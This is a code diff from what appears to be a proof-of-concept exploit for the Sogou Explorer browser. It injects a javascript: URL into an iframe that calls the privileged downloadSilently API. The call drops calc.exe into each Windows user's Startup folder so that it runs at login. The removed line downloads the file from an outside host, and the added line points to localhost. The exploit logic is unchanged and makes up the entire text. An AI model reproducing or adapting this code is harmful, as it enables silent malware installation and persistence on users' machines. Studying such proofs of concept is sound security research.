@@ -145,7 +145,7 @@ function f() {
         if (i != users.length - 1)
           users_str += ',';
       }
-      x1.src = "javascript:if(location != 'about:blank') { var users=[" + users_str + "]; for (var i = 0; i < users.length; ++i) sogouExplorer.downloads.downloadSilently({url:'http://a.zhchbin.xyz/calc.exe',filename:'calc.exe',path:'C:\\\\Users\\\\' + users[i] + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\',method:'GET'});}"
+      x1.src = "javascript:if(location != 'about:blank') { var users=[" + users_str + "]; for (var i = 0; i < users.length; ++i) sogouExplorer.downloads.downloadSilently({url:'http://127.0.0.1/calc.exe',filename:'calc.exe',path:'C:\\\\Users\\\\' + users[i] + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\',method:'GET'});}"
     }
   }
 }
